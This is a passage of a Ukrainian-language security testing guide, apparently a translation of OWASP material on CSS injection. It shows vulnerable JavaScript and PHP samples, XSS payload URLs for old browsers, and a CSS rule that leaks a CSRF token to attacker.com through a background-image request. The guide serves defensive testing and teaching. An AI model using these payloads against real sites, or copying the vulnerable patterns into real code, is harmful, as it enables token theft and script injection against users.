# Тестування на ін'єкцію CSS

## Короткий опис

Вразливість внесення CSS коду передбачає можливість внести довільний CSS код в контексті довіреного веб-сайту, який рендериться в браузері жертви. Вплив такого типу вразливості варіюється в залежності від наданого CSS навантаження. Це може призвести до міжсайтового скриптінгу або витікання даних.

Ця вразливість виникає, коли додаток дозволяє користувацькому CSS втручатися у законні стилі додатку. Внесення коду в контекст CSS може дати можливість атакувальнику виконувати JavaScript в певних умовах або видобувати чутливі значення за допомогою CSS селекторів та функцій, які здатні генерувати HTTP запити. Зазвичай надання користувачам можливості налаштовувати сторінки, надаючи власні CSS файли, є значним ризиком.

Наведений нижче код JavaScript показує можливий вразливий скрипт, в якому атакувальник може контролювати location.hash (джерело), яке потрапляє до функції cssText (приймач). В цьому конкретному випадку це може призвести до DOM-базового XSS в старших версіях браузера; для докладнішої інформації дивіться Шпаргалка з профілактики DOM-базового XSS.

<a id="a1">Натисніть мене</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
Атакувальник може націлитися на жертву, запитавши її відвідати наступні URL-адреси:

www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current; (Opera [8,12])
www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)
Така сама вразливість може з'явитися у випадку відображеного XSS, наприклад, у наступному PHP коді:

<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
Додаткові сценарії атак передбачають можливість видобування даних за допомогою чистих CSS правил. Такі атаки можуть бути виконані за допомогою CSS селекторів, що призводить до витікання даних, наприклад, токенів CSRF.

Ось приклад коду, який намагається вибрати введення з іменем, яке відповідає csrf_token і значенням, що починається з a. Використовуючи атаку методом брутфорса для визначення значення атрибута, можна виконати атаку, яка надсилає значення на домен атакувальника, наприклад, спробуючи встановити фонове зображення на вибраному введенні.

<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
Інші атаки, що використовують запитаний контент, такий як CSS, виділені в доповіді Маріо Хайдеріха, "Got Your Nose" на YouTube.

## Цілі тестування

Визначення точок внесення CSS. Оцінка впливу внесення.

## Як тестувати

Код слід аналізувати, щоб визначити, чи користувачу дозволено внесення вмісту в контекст CSS. Зокрема, слід дослідити спосіб, яким веб-сайт повертає правила CSS на основі введених даних.

Наведений нижче приклад є базовим:

<a id="a1">Натисніть мене</a>
<b>Привіт</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
Вище наведений код містить джерело location.hash, яке контролюється атакувальником і може внести зміни безпосередньо в атрибут стилю елементу HTML. Як зазначалося вище, це може призвести до різних результатів в залежності від використовув